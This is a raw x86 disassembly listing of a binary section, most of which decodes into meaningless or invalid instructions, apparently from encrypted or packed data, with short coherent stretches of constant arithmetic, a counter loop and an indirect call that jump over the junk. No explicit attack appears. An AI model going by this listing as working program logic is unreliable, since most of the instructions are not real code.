  410edf:	cmc    
  410ee0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ee1:	sub    ch,BYTE PTR [edi-0xbc1ec35]
  410ee7:	mov    esi,esp
  410ee9:	outs   dx,BYTE PTR ds:[esi]
  410eea:	push   ebp
  410eeb:	xchg   esi,eax
  410eec:	or     al,0x20
  410eee:	pop    ss
  410eef:	cmp    BYTE PTR [edi+ebp*1+0x41],dl
  410ef3:	dec    ecx
  410ef4:	out    dx,eax
  410ef5:	sbb    DWORD PTR [edx],edx
  410ef7:	fld    QWORD PTR [edx-0x616ec5e6]
  410efd:	or     eax,0xf0595d39
  410f02:	push   edx
  410f03:	(bad)  
  410f04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f05:	or     al,0xab
  410f07:	in     al,dx
  410f08:	repnz pop ebp
  410f0a:	ret    
  410f0b:	dec    esp
  410f0c:	add    ecx,DWORD PTR [ebp+0x2a]
  410f0f:	fistp  DWORD PTR [eax]
  410f11:	sbb    al,0x3a
  410f13:	mov    WORD PTR [eax+esi*4],ss
  410f16:	jo     0x410f6a
  410f18:	jmp    0x4240:0xee239342
  410f1f:	test   BYTE PTR [eax-0x423205a0],0x23
  410f26:	ficomp WORD PTR [edi-0x5cad2572]
  410f2c:	sub    al,0x6b
  410f2e:	ins    BYTE PTR es:[edi],dx
  410f2f:	out    dx,eax
  410f30:	retf   
  410f31:	dec    ebx
  410f32:	mov    ebp,0x2d57e5a3
  410f37:	xor    al,0xa2
  410f39:	sbb    eax,0x20e9f421
  410f3e:	push   ebp
  410f3f:	mov    cl,0x2c
  410f41:	sub    DWORD PTR [edx-0x38ac126b],esp
  410f47:	mov    edi,0x387be52e
  410f4c:	xor    DWORD PTR [ecx+0x55],ebx
  410f4f:	daa    
  410f50:	call   0x76598246
  410f55:	fs xor eax,0xc6ff2762
  410f5b:	add    eax,0xaec5c9d3
  410f60:	pop    edi
  410f61:	rol    ch,cl
  410f63:	push   0xfe948677
  410f68:	pop    es
  410f69:	lods   eax,DWORD PTR ds:[esi]
  410f6a:	data16 sub BYTE PTR [edx],0xcf
  410f6e:	sub    ch,BYTE PTR [ebp-0x45]
  410f71:	js     0x410f4f
  410f73:	mov    edi,0xd9f4a1fc
  410f78:	dec    esi
  410f79:	xor    eax,0x528f526
  410f7e:	int3   
  410f7f:	shr    BYTE PTR ds:0xa0d55810,0xce
  410f86:	or     edx,esi
  410f88:	inc    ebx
  410f89:	mov    eax,ds:0x33b2b664
  410f8e:	cld    
  410f8f:	les    esi,FWORD PTR [edx]
  410f91:	dec    ecx
  410f92:	push   0xffffffda
  410f94:	lods   eax,DWORD PTR ds:[esi]
  410f95:	xchg   edi,eax
  410f96:	jae    0x410f38
  410f98:	mov    eax,ds:0x41b22c
  410f9d:	mov    edx,0x32729c
  410fa2:	sub    eax,edx
  410fa4:	adc    DWORD PTR ds:0x42fd6e,ebx
  410faa:	mov    ecx,0x7510855
  410faf:	push   esi
  410fb0:	mov    esi,DWORD PTR [ebp+0xc]
  410fb3:	xor    eax,ecx
  410fb5:	mov    DWORD PTR ds:0x42e11c,0x4b31
  410fbf:	jmp    0x4113c4
  410fc4:	xchg   edx,eax
  410fc5:	shl    DWORD PTR [edi+eiz*8+0x71516771],cl
  410fcc:	push   ebp
  410fcd:	paddsw mm6,QWORD PTR [eax+0x54ac0e1f]
  410fd4:	es dec esi
  410fd6:	jo     0x411048
  410fd8:	pop    eax
  410fd9:	jge    0x41104b
  410fdb:	jo     0x41101a
  410fdd:	push   ss
  410fde:	xchg   esi,eax
  410fdf:	inc    edi
  410fe0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410fe1:	mov    edi,0xdc469ffe
  410fe6:	sbb    ecx,DWORD PTR [ebx+ecx*8+0x75366d0d]
  410fed:	or     DWORD PTR [ebx+0x62daebdb],esi
  410ff3:	retf   
  410ff4:	pop    edx
  410ff5:	cmp    eax,0xa5fbcf44
  410ffa:	push   cs
  410ffb:	push   es
  410ffc:	jo     0x410fb1
  410ffe:	sub    BYTE PTR [esp],dh
  411001:	xor    al,0xf0
  411003:	and    BYTE PTR [ebp+ebp*4-0x1d],cl
  411007:	dec    eax
  411008:	sbb    al,0x6c
  41100a:	xor    DWORD PTR [edx],edx
  41100c:	ret    0xe69
  41100f:	mov    esi,0xa505d532
  411014:	xor    ecx,esp
  411016:	push   edi
  411017:	xchg   bh,dl
  411019:	fist   DWORD PTR [ebx-0x39]
  41101c:	push   esp
  41101d:	aad    0x59
  41101f:	mov    bl,0x79
  411021:	pop    ebp
  411022:	lods   eax,DWORD PTR ds:[esi]
  411023:	bnd ret 0x6b19
  411027:	xchg   BYTE PTR ds:0x8edbc69,ch
  41102d:	stos   BYTE PTR es:[edi],al
  41102e:	frstor [edi-0x66c24dde]
  411034:	and    DWORD PTR [edi],ecx
  411036:	jmp    0x411044
  411038:	or     DWORD PTR [eax],ebp
  41103a:	scas   al,BYTE PTR es:[edi]
  41103b:	test   al,0xf7
  41103d:	sbb    esi,DWORD PTR [edi]
  41103f:	xchg   BYTE PTR [edi],al
  411041:	jecxz  0x411089
  411043:	mov    dh,0x7
  411045:	sub    BYTE PTR [ebx*2-0x4a8042c],ah
  41104c:	ja     0x411040
  41104e:	and    DWORD PTR [eax-0x335f2a6],ecx
  411054:	add    DWORD PTR ds:0x51c5b951,esp
  41105a:	xchg   esp,eax
  41105b:	jge    0x410fe9
  41105d:	dec    edx
  41105e:	push   edx
  41105f:	out    dx,al
  411060:	jnp    0x411037
  411062:	imul   esp,DWORD PTR [eax+edx*1-0x69],0xacf12489
  41106a:	adc    dl,BYTE PTR [edi]
  41106c:	add    al,0x41
  41106e:	mov    edi,0x1530ef09
  411073:	test   al,0xe0
  411075:	mov    ecx,0x8e330b12
  41107a:	jns    0x4110af
  41107c:	jb     0x4110a4
  41107e:	bound  esi,QWORD PTR [esp+edi*1+0x41]
  411082:	test   DWORD PTR [edi],0xcb2c58e6
  411088:	mov    ch,0x81
  41108a:	sbb    BYTE PTR [ebx],cl
  41108c:	out    0x13,al
  41108e:	out    0x6f,eax
  411090:	xchg   BYTE PTR ds:0xbb027381,dl
  411096:	mov    edx,0xcad26f7c
  41109b:	inc    edx
  41109c:	inc    ecx
  41109d:	paddd  mm5,QWORD PTR [eax-0x1e7d7664]
  4110a4:	leave  
  4110a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4110a6:	jns    0x4110f2
  4110a8:	jmp    0x41105a
  4110aa:	popa   
  4110ab:	xor    esi,DWORD PTR [esi+ebx*4-0x76]
  4110af:	fsub   DWORD PTR [eax-0x3f]
  4110b2:	xlat   BYTE PTR ds:[ebx]
  4110b3:	pop    ebp
  4110b4:	xchg   ebp,eax
  4110b5:	pop    esi
  4110b6:	mov    es,ebp
  4110b8:	adc    dl,bh
  4110ba:	inc    ebp
  4110bb:	hlt    
  4110bc:	data16 jmp 0x411092
  4110bf:	cwde   
  4110c0:	mov    bl,BYTE PTR [esi+0x60]
  4110c3:	sub    eax,0x895dfa26
  4110c8:	outs   dx,DWORD PTR ds:[esi]
  4110c9:	clc    
  4110ca:	cmp    al,BYTE PTR [eax+edi*8+0x66]
  4110ce:	push   ebp
  4110cf:	inc    esi
  4110d0:	sbb    DWORD PTR [esi],esp
  4110d2:	xchg   edx,eax
  4110d3:	adc    eax,0x9b44addf
  4110d8:	xchg   esp,eax
  4110d9:	cmp    dh,BYTE PTR [edi+0x44e0d194]
  4110df:	icebp  
  4110e0:	mov    edi,0x2f5a578c
  4110e5:	imul   esi,DWORD PTR [ebp-0x6426c55],0x4b62fbb5
  4110ef:	aad    0xc9
  4110f1:	mov    edi,0xb88539fa
  4110f6:	repz (bad) [eax+0x1c0ca543]
  4110fd:	pop    eax
  4110fe:	and    al,0xba
  411100:	xor    DWORD PTR [ebx+0x27],edx
  411103:	push   edi
  411104:	jmp    0x4110f1
  411106:	mov    eax,0x3a51f5d8
  41110b:	xor    al,0x44
  41110d:	push   edx
  41110e:	dec    ebx
  41110f:	test   DWORD PTR [ecx],0x7ca59dd
  411115:	arpl   ax,sp
  411117:	(bad)  
  411118:	mov    ebp,0x256e93b5
  41111d:	sti    
  41111e:	dec    eax
  41111f:	adc    eax,0x345b3a16
  411124:	sub    ecx,DWORD PTR [ebp+0x2f277a40]
  41112a:	neg    BYTE PTR [ecx+edx*2+0x3]
  41112e:	mov    dh,0xa4
  411130:	pop    ds
  411131:	dec    esi
  411132:	jecxz  0x411107
  411134:	aaa    
  411135:	mov    edi,0x90f960b7
  41113a:	jns    0x411182
  41113c:	xchg   esi,eax
  41113d:	pop    ecx
  41113e:	cmc    
  41113f:	shl    DWORD PTR [ebp-0x75],1
  411142:	out    dx,eax
  411143:	in     al,0x2
  411145:	adc    al,0xcb
  411147:	(bad)  
  411148:	imul   eax,DWORD PTR [eax+0x61c0b6cf],0x40
  41114f:	push   esp
  411150:	mov    cl,BYTE PTR [ebx+0x3a1919f4]
  411156:	mov    ds:0x960fdd8b,eax
  41115b:	sbb    al,0x4c
  41115d:	outs   dx,BYTE PTR ds:[esi]
  41115e:	outs   dx,BYTE PTR ds:[esi]
  41115f:	imul   eax,DWORD PTR [esp+eiz*8+0x2d],0xffffffc9
  411164:	jge    0x84957317
  41116a:	loope  0x41113c
  41116c:	inc    ebx
  41116d:	test   al,0x33
  41116f:	mov    ah,0x68
  411171:	sbb    al,0x3a
  411173:	jne    0x41114a
  411175:	sbb    BYTE PTR [eax],ah
  411177:	rcl    ecx,cl
  411179:	fisubr WORD PTR [ecx+0x9]
  41117c:	xchg   BYTE PTR [edi-0x37],cl
  41117f:	and    dh,BYTE PTR ds:0xac1f7f1e
  411185:	dec    esi
  411186:	addr16 ss dec esi
  411189:	aam    0x23
  41118b:	mov    eax,ds:0x88cc2942
  411190:	sub    bl,BYTE PTR [ebx+edi*4+0x4d]
  411194:	shl    DWORD PTR [ecx+edx*1+0x65],cl
  411198:	into   
  411199:	aaa    
  41119a:	std    
  41119b:	xchg   esi,eax
  41119c:	fimul  DWORD PTR [esi-0x3bd0f17c]
  4111a2:	xlat   BYTE PTR ds:[ebx]
  4111a3:	mov    esi,DWORD PTR [ecx-0x236202d5]
  4111a9:	xchg   ebx,ebp
  4111ab:	mov    al,ds:0x2ed188fd
  4111b0:	push   cs
  4111b1:	enter  0xd8c8,0x2e
  4111b5:	inc    esp
  4111b6:	(bad)  
  4111b8:	xor    bl,ah
  4111ba:	out    dx,eax
  4111bb:	xchg   BYTE PTR [esi+ebp*1+0x58],bh
  4111bf:	(bad)  
  4111c0:	cmp    al,BYTE PTR [ebx-0x24c729a3]
  4111c6:	push   0x8be86dff
  4111cb:	mov    ?,WORD PTR [ebp-0x7]
  4111ce:	call   0xe08fe81d
  4111d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4111d4:	sub    ecx,DWORD PTR [esi]
  4111d6:	stc    
  4111d7:	psubsw mm7,QWORD PTR [esi+0x67]
  4111db:	fcom   DWORD PTR [esi-0x5f]
  4111de:	fisttp WORD PTR [ecx]
  4111e0:	daa    
  4111e1:	push   ds
  4111e2:	lods   eax,DWORD PTR ds:[esi]
  4111e3:	retf   
  4111e4:	lock mov bl,0x92
  4111e7:	push   ds
  4111e8:	pop    ebx
  4111e9:	cmp    DWORD PTR [eax+0x54845d00],eax
  4111ef:	std    
  4111f0:	hlt    
  4111f1:	test   al,0x19
  4111f3:	imul   esi,DWORD PTR [ebx+ebp*1-0x13],0x26
  4111f8:	cmp    al,0xb7
  4111fa:	(bad)  
  4111fc:	js     0x4111aa
  4111fe:	add    eax,0x8493262f
  411203:	dec    ebp
  411204:	enter  0xec6e,0x4c
  411208:	dec    edx
  411209:	faddp  st(3),st
  41120b:	arpl   WORD PTR [esi-0x61],si
  41120e:	js     0x411221
  411210:	jo     0x41122a
  411212:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411213:	mov    eax,0xdd555ad2
  411218:	add    eax,0x6b23e91
  41121d:	lahf   
  41121e:	call   0x74d911ff
  411223:	adc    DWORD PTR [ebx+0x8],esi
  411226:	push   0xd91da3c1
  41122b:	stos   DWORD PTR es:[edi],eax
  41122c:	inc    edi
  41122d:	ja     0x4111d2
  41122f:	gs retf 0xaa27
  411233:	out    dx,eax
  411234:	in     eax,0xb4
  411236:	jne    0x4111cd
  411238:	add    BYTE PTR [eax],bh
  41123a:	add    eax,0x1c81fb81
  41123f:	lahf   
  411240:	jl     0x4111ea
  411242:	cli    
  411243:	retf   
  411244:	pop    edi
  411245:	ror    BYTE PTR [eax+0x44],cl
  411248:	idiv   dl
  41124a:	(bad)  
  41124b:	mov    esp,0xa4f2cf66
  411250:	fadd   DWORD PTR [ecx-0x2f]
  411253:	ret    0x8e9f
  411256:	aam    0x15
  411258:	lods   al,BYTE PTR ds:[esi]
  411259:	in     al,dx
  41125a:	(bad)  
  41125b:	fsubr  DWORD PTR [eax+eiz*2+0x2b]
  41125f:	push   0x928b9d77
  411264:	xchg   edi,eax
  411265:	inc    ebx
  411266:	mov    ecx,0x77ab3577
  41126b:	push   ebp
  41126c:	test   BYTE PTR [eax],cl
  41126e:	adc    BYTE PTR [esi],ah
  411270:	or     ch,cl
  411272:	mov    ecx,0x1109f3
  411277:	enter  0x754d,0xcd
  41127b:	scas   eax,DWORD PTR es:[edi]
  41127c:	cmp    ecx,DWORD PTR [eax+edx*4+0x5b]
  411280:	or     DWORD PTR [edi+edx*2+0x54670b5e],0xaf31b3f8
  41128b:	icebp  
  41128c:	xor    eax,0x835a760f
  411291:	fisttp WORD PTR [ebp-0x5363b380]
  411297:	ret    0x86c4
  41129a:	push   ecx
  41129b:	jg     0x4112de
  41129d:	dec    edi
  41129e:	frstor [eax-0x55]
  4112a1:	xchg   esi,eax
  4112a2:	mov    BYTE PTR [edx-0x52595b77],cl
  4112a8:	adc    edx,esp
  4112aa:	and    al,0xfa
  4112ac:	lods   eax,DWORD PTR ds:[esi]
  4112ad:	jo     0x4112be
  4112af:	jmp    0x948be1f6
  4112b4:	outs   dx,BYTE PTR ds:[esi]
  4112b5:	scas   eax,DWORD PTR es:[edi]
  4112b6:	jno    0x411314
  4112b8:	mov    eax,0xceb4e19d
  4112bd:	sti    
  4112be:	xchg   esp,eax
  4112bf:	cmc    
  4112c0:	push   esp
  4112c1:	mov    ds:0x27f1bbd7,eax
  4112c6:	repz daa 
  4112c8:	and    al,0x27
  4112ca:	fsub   DWORD PTR [edi-0x637f45c9]
  4112d0:	cmp    BYTE PTR [ecx+0x3fd962b7],dh
  4112d6:	push   cs
  4112d7:	aad    0x5c
  4112d9:	mov    edx,0x5fc8cde2
  4112de:	bnd ret 0xd298
  4112e2:	es push ss
  4112e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112e5:	push   ebp
  4112e6:	arpl   sp,si
  4112e8:	and    BYTE PTR [eax+edi*4],cl
  4112eb:	ret    
  4112ec:	adc    ebx,DWORD PTR [ebx+0x14e94d7d]
  4112f2:	push   cs
  4112f3:	mov    WORD PTR [ecx-0x831b222],es
  4112f9:	loope  0x4112fb
  4112fb:	xor    BYTE PTR [ecx],ch
  4112fd:	out    dx,eax
  4112fe:	dec    ebx
  4112ff:	(bad)  
  411300:	stc    
  411301:	ss xor edi,esp
  411304:	pusha  
  411305:	in     eax,dx
  411306:	cwde   
  411307:	sbb    esi,ecx
  411309:	or     DWORD PTR [ebp-0x4229dc12],edi
  41130f:	mov    dl,0x3f
  411311:	(bad)  [ecx-0x2a]
  411314:	(bad)  
  411315:	jge    0x411324
  411317:	das    
  411318:	scas   eax,DWORD PTR es:[edi]
  411319:	pop    esi
  41131a:	inc    BYTE PTR [eax-0x1b]
  41131d:	sub    eax,0x2b1cb43a
  411322:	dec    edx
  411323:	lods   eax,DWORD PTR ds:[esi]
  411324:	(bad)  
  411325:	push   esp
  411326:	inc    esi
  411327:	hlt    
  411328:	mov    ebp,DWORD PTR [esi+edi*2+0x6d738a4f]
  41132f:	out    0x5c,al
  411331:	lods   al,BYTE PTR ds:[esi]
  411332:	cmp    al,BYTE PTR [edx+ecx*1]
  411335:	cmp    dl,BYTE PTR [ecx+0x1]
  411338:	push   ecx
  411339:	(bad)  
  41133a:	xor    bl,BYTE PTR [edx+0x1]
  41133d:	mov    ch,dl
  41133f:	pop    ds
  411340:	add    DWORD PTR [ebx+0x32],edi
  411343:	push   0x44d97142
  411348:	jmp    0x1c66f865
  41134d:	sbb    al,BYTE PTR [edx-0x1c65876d]
  411353:	xchg   ebx,eax
  411354:	in     eax,0x70
  411356:	mov    cl,0xff
  411358:	push   edi
  411359:	and    BYTE PTR [ebx],0xbd
  41135c:	pop    ebx
  41135d:	pop    esi
  41135e:	pop    ebp
  41135f:	in     al,dx
  411360:	and    esp,edx
  411362:	loope  0x4113d2
  411364:	js     0x411352
  411366:	sub    DWORD PTR [ebx],edx
  411368:	push   ss
  411369:	rcl    BYTE PTR [ecx],0x10
  41136c:	add    al,0x64
  41136e:	test   BYTE PTR ds:[ecx+0xa],dh
  411372:	xlat   BYTE PTR ds:[ebx]
  411373:	or     al,BYTE PTR [edx-0x5bce5222]
  411379:	retf   
  41137a:	push   esp
  41137b:	fs jmp 0xa93088b5
  411381:	cmp    ebp,DWORD PTR [edi+ebx*8]
  411384:	psrad  mm5,mm2
  411387:	scas   eax,DWORD PTR es:[edi]
  411388:	xchg   esp,eax
  411389:	repz hlt 
  41138b:	push   es
  41138c:	sbb    bh,BYTE PTR [edx+0x518b97e7]
  411392:	mov    ds:0x856e7ca1,al
  411397:	xor    al,0xef
  411399:	xor    ch,0xb8
  41139c:	push   eax
  41139d:	mov    ecx,0xa785a4ab
  4113a2:	pushf  
  4113a3:	das    
  4113a4:	mov    ecx,0xe9398e8f
  4113a9:	into   
  4113aa:	jmp    0x37ee7434
  4113af:	sahf   
  4113b0:	add    ebp,DWORD PTR [eax+ebx*2-0x60e932ba]
  4113b7:	jnp    0x4113e7
  4113b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4113ba:	pop    esp
  4113bb:	(bad)  
  4113bd:	cld    
  4113be:	dec    esp
  4113bf:	add    eax,0x8d526f20
  4113c4:	cmp    eax,esi
  4113c6:	mov    DWORD PTR ds:0x42fcf1,0x78e4
  4113d0:	je     0x411c9a
  4113d6:	mov    eax,ds:0x41b224
  4113db:	and    DWORD PTR ds:0x42fd7a,0x0
  4113e5:	mov    esi,DWORD PTR ds:0x42fd7a
  4113eb:	inc    esi
  4113ec:	mov    DWORD PTR ds:0x42fd7a,esi
  4113f2:	cmp    DWORD PTR ds:0x42fd7a,0x8
  4113f9:	jne    0x41140f
  4113ff:	push   0x42e1e7
  411404:	push   0x42e26d
  411409:	call   DWORD PTR ds:0x42e567
  41140f:	cmp    DWORD PTR ds:0x42fd7a,0x7
  411416:	jne    0x411429
  41141c:	mov    esi,DWORD PTR ds:0x42fd7a
  411422:	inc    esi
  411423:	mov    DWORD PTR ds:0x42fd7a,esi
  411429:	cmp    DWORD PTR ds:0x42fd7a,0x13
  411430:	jb     0x4113e5
  411436:	jmp    0x41183b
  41143b:	and    cl,al
  41143d:	leave  
  41143e:	adc    ch,cl
  411440:	adc    ecx,esp
  411442:	call   0xcb53bead
  411447:	sub    eax,0xef1958d
  41144c:	dec    edx
  41144d:	jo     0x4114bf
  41144f:	pop    eax
  411450:	jge    0x4114c2
  411452:	jo     0x41149d
  411454:	outs   dx,BYTE PTR ds:[esi]
  411455:	pop    ebp
  411456:	mov    eax,0x7dc80c15
  41145b:	les    edx,FWORD PTR [edi]
  41145d:	inc    eax
  41145e:	outs   dx,BYTE PTR ds:[esi]
  41145f:	mov    esp,0xef47a930
  411464:	push   edx
  411465:	xchg   ebx,eax
  411466:	loop   0x41143e
  411468:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411469:	cdq    
  41146a:	imul   esp,DWORD PTR [edi-0x32],0xffffff81
  41146e:	scas   eax,DWORD PTR es:[edi]
  41146f:	sbb    DWORD PTR [edx+edx*4-0x24],eax
  411473:	or     DWORD PTR [eax],ebp
  411475:	push   ebp
  411476:	sbb    BYTE PTR [ebp+0x14],dl
  411479:	mov    edi,0xa75b82dd
  41147e:	mov    ebx,0xa75337bf
  411483:	adc    BYTE PTR [ebx-0x4f2264a3],al
  411489:	dec    edx
  41148a:	sbb    ah,BYTE PTR [eax-0xd1c2bcb]
  411490:	fimul  DWORD PTR [ecx]
  411492:	sub    BYTE PTR [eax],ch
  411494:	std    
  411495:	shl    BYTE PTR [edx],0x3a
  411498:	std    
  411499:	xor    eax,0xa7b347d2
  41149e:	rcl    DWORD PTR [ebx+0x1f5fc24a],0xd5
  4114a5:	shl    bh,0x79
  4114a8:	sub    eax,0x6d4b857d
  4114ad:	xor    eax,0x50cdd659
  4114b2:	xchg   bh,bl
  4114b4:	cld    
  4114b5:	xor    al,0x9c
  4114b7:	xchg   BYTE PTR [eax-0x4610fd9b],al
  4114bd:	cmc    
  4114be:	into   
  4114bf:	mov    edi,0x95a18491
  4114c4:	xchg   ebx,eax
  4114c5:	mov    eax,ds:0x508d0c99
  4114ca:	adc    DWORD PTR [ebx],ebp
  4114cc:	xchg   ecx,eax
  4114cd:	jecxz  0x411458
  4114cf:	sti    
  4114d0:	popf   
  4114d1:	push   esi
  4114d2:	clc    
  4114d3:	scas   eax,DWORD PTR es:[edi]
  4114d4:	xor    ch,BYTE PTR [ebx]
  4114d6:	mov    eax,ds:0xed38fac7
  4114db:	stos   BYTE PTR es:[edi],al
  4114dc:	jo     0x4114b3
  4114de:	fidiv  DWORD PTR [eax+0x7f]
  4114e1:	inc    eax
  4114e2:	pop    ss
  4114e3:	loopne 0x4114ef
  4114e5:	sbb    eax,0x39ff0b06
  4114ea:	mov    DWORD PTR [eax-0x55f25551],eax
  4114f0:	ds jns 0x4114f9
  4114f3:	push   edi
  4114f4:	xlat   BYTE PTR ds:[ebx]
  4114f5:	push   ecx
  4114f6:	push   eax
  4114f7:	sub    eax,0x782e3a55
  4114fc:	in     al,0x57
  4114fe:	mov    dl,0x5d
  411500:	ret    
  411501:	or     ebp,DWORD PTR [ebx+0x4fd66595]
  411507:	inc    ecx
  411508:	fimul  DWORD PTR [esi-0x5a]
  41150b:	cmp    cl,0x6c
  41150e:	mov    edi,0x7308e48b
  411513:	lock pop ebp
  411515:	pop    esp
  411516:	(bad)  
  411517:	sahf   
  411518:	dec    edi
  411519:	data16 int3 
  41151b:	xchg   esp,eax
  41151c:	addr16 adc al,0x1e
  41151f:	or     bh,BYTE PTR [edi]
  411521:	lds    ebp,FWORD PTR [ebp+0x1649cc00]
  411527:	rol    ecx,cl
  411529:	je     0x4114e3
  41152b:	add    eax,0x9b35807b
  411530:	and    DWORD PTR ds:0xa1f2c6bc,0x57fa464a
  41153a:	call   0xb14eb7a2
  41153f:	shl    DWORD PTR [ebp-0x313fcd5c],0xcd
  411546:	pop    ds
  411547:	in     al,0xb1
  411549:	loope  0x4115a3
  41154b:	rol    edx,1
  41154d:	mov    ah,0x4d
  41154f:	xchg   esp,eax
  411550:	cli    
  411551:	outs   dx,BYTE PTR ds:[esi]
  411552:	push   ebx
  411553:	mov    edx,0xbce7770e
  411558:	jp     0x4115a4
  41155a:	retf   0xfebd
  41155d:	cmp    edi,DWORD PTR [esi+0x17]
  411560:	adc    DWORD PTR [edx+0x1c],0x85be28b9
  411567:	les    esp,FWORD PTR [ebx]
  411569:	push   es
  41156a:	je     0x4115e3
  41156c:	int    0xa1
  41156e:	clc    
  41156f:	out    0x8,eax
  411571:	add    eax,DWORD PTR [esi]
  411573:	cmp    cl,dl
  411575:	iret   
  411576:	cmp    ecx,DWORD PTR [ebp+0x75]
  411579:	pop    esi
  41157a:	test   DWORD PTR [ebx],esi
  41157c:	arpl   dx,bx
  41157e:	or     al,0x3a
  411580:	push   ecx
  411581:	mov    dh,0xed
  411583:	jg     0x411570
  411585:	neg    DWORD PTR [edi-0x48590e44]
  41158b:	nop
  41158c:	fldenv [ebp+eax*2+0x3fbbe063]
  411593:	mov    bh,al
  411595:	sbb    ch,0xc1
  411598:	shl    DWORD PTR [eax],1
  41159a:	adc    al,0xca
  41159c:	enter  0x8af8,0x60
  4115a0:	(bad)  
  4115a1:	fidiv  WORD PTR [ebp-0x35f79109]
  4115a7:	sbb    ebx,DWORD PTR [edi-0x416721fe]
  4115ad:	jbe    0x411581
  4115af:	push   eax
  4115b0:	mov    ecx,0x9c220a37
  4115b5:	push   es
  4115b6:	stos   BYTE PTR es:[edi],al
  4115b7:	add    al,0x6d
  4115b9:	mov    dl,0x2b
  4115bb:	adc    cl,BYTE PTR [edx+0x72]
  4115be:	adc    ch,BYTE PTR [ecx-0x58fe425]
  4115c4:	push   ds
  4115c5:	fst    QWORD PTR [eax+eax*4]
  4115c8:	(bad)
  4115cc:	fild   WORD PTR [ebp+0x7af8b120]
  4115d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4115d3:	or     al,0xc
  4115d5:	jp     0x41155b
  4115d7:	pop    edi
  4115d8:	mov    ebp,0x303c3c7
  4115dd:	iret   
  4115de:	pop    edx
  4115df:	and    ch,bh
  4115e1:	imul   edx,DWORD PTR [ecx-0x6af6f945],0x9205ee92
  4115eb:	and    ch,BYTE PTR [ebx-0x50]
  4115ee:	fmul   DWORD PTR [edi+0x24]
  4115f1:	(bad)  
  4115f2:	cs xor edx,edx
  4115f5:	mov    edi,0x6246ac7b
  4115fa:	mov    DWORD PTR [eax],edi
  4115fc:	add    ebx,DWORD PTR [esi+0x76]
  4115ff:	adc    edx,DWORD PTR [edx-0x2e21d89d]
  411605:	inc    esp
  411606:	or     eax,0x6fad6275
  41160b:	mov    ebp,0xbfcaec0b
  411610:	daa    
  411611:	nop
  411612:	dec    BYTE PTR [eax]
  411614:	loopne 0x41164b
  411616:	out    dx,al
  411617:	add    BYTE PTR [ebx-0xc],ch
  41161a:	stos   BYTE PTR es:[edi],al
  41161b:	add    eax,0xbbe8f753
  411620:	push   esi
  411621:	jb     0x411647
  411623:	pop    esi
  411624:	(bad)  
  411625:	fmul   st,st(1)
  411627:	jne    0x411617
  411629:	aam    0x9f
  41162b:	outs   dx,BYTE PTR ds:[esi]
  41162c:	scas   eax,DWORD PTR es:[edi]
  41162d:	(bad)  
  41162e:	dec    ebx
  411630:	addr16 enter 0xeec8,0xfb
  411635:	pop    ebp
  411636:	std    
  411637:	or     DWORD PTR [ebp-0x6eba8d02],esp
  41163d:	sub    al,0x9b
  41163f:	mov    ds:0x1dc1c799,al
  411644:	sub    ebx,0x3448f99
  41164a:	add    eax,0xf9a103ea
  41164f:	pop    es
  411650:	test   al,0x96
  411652:	nop
  411653:	jmp    0xec07:0x90ec29af
  41165a:	sbb    eax,0x7ca26c84
  41165f:	mov    ah,0x16
  411661:	add    ch,cl
  411663:	cli    
  411664:	shl    BYTE PTR [edx-0x3e],0x71
  411668:	inc    edx
  411669:	ret    0x233f
  41166c:	ror    edi,cl
  41166e:	and    al,0xfd
  411670:	(bad)  
  411671:	(bad)  
  411674:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411675:	push   0x2a
  411677:	or     BYTE PTR [ebx+0x685469a8],0xf
  41167e:	iret   
  41167f:	or     ecx,DWORD PTR [ebx+edi*1]
  411682:	sbb    al,0x4d
  411684:	sbb    eax,0xf6df6998
  411689:	jb     0x411703
  41168b:	ret    
  41168c:	and    BYTE PTR [ebx],ch
  41168e:	dec    eax
  41168f:	sbb    ebx,DWORD PTR [edi-0x28a03c87]
  411695:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411696:	mov    gs,WORD PTR [edi-0x58]
  411699:	cmc    
  41169a:	adc    DWORD PTR [ebx-0x627e0cfa],esp
  4116a0:	and    ecx,DWORD PTR [ebx-0x7a178125]
  4116a6:	mov    esp,0x805ab0f6
  4116ab:	leave  
  4116ac:	xchg   esp,eax
  4116ad:	adc    DWORD PTR [ebx+ecx*1-0x43648773],0x24
  4116b5:	pop    ecx
  4116b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116b7:	fisttp QWORD PTR [edi]
  4116b9:	nop
  4116ba:	aad    0xc6
  4116bc:	les    ecx,FWORD PTR [esi+0x72]
  4116bf:	jns    0x41167d
  4116c1:	add    ebp,DWORD PTR [ebx]
  4116c3:	imul   ebx,DWORD PTR [ebx],0xe30ce962
  4116c9:	push   esp
  4116ca:	push   edi
  4116cb:	and    BYTE PTR [ecx],dh
  4116cd:	loope  0x411698
  4116cf:	sbb    ecx,ecx
  4116d1:	mov    al,ds:0x68161176
  4116d6:	sub    BYTE PTR [esi-0x2dabe9ea],cl
  4116dc:	aas    
  4116dd:	sub    al,0x21
  4116df:	call   0xf0f9fd6
  4116e4:	mov    al,ds:0x558025ab
  4116e9:	test   DWORD PTR [ebx-0xb1e7e79],esp
  4116ef:	and    al,0xe8
  4116f1:	aaa    
  4116f2:	sub    bl,BYTE PTR [edx+0xb]
  4116f5:	mov    dl,0x97
  4116f7:	inc    esi
  4116f8:	bound  edx,QWORD PTR [edx-0x4749e65c]
  4116fe:	test   BYTE PTR [esi],bh
  411700:	jmp    0x4116f0
  411702:	aas    
  411703:	mov    cs,WORD PTR [eax]
  411705:	(bad)
  411709:	out    dx,al
  41170a:	cld    
  41170b:	jg     0x411740
  41170d:	mov    ds:0x9981f9b2,al
  411712:	jo     0x411760
  411714:	aas    
  411715:	add    esi,ecx
  411717:	sbb    al,0xe0
  411719:	jno    0x4116d0
  41171b:	or     al,0x11
  41171d:	pop    esi
  41171e:	xchg   ebp,eax
  41171f:	xchg   esi,eax
  411720:	dec    edi
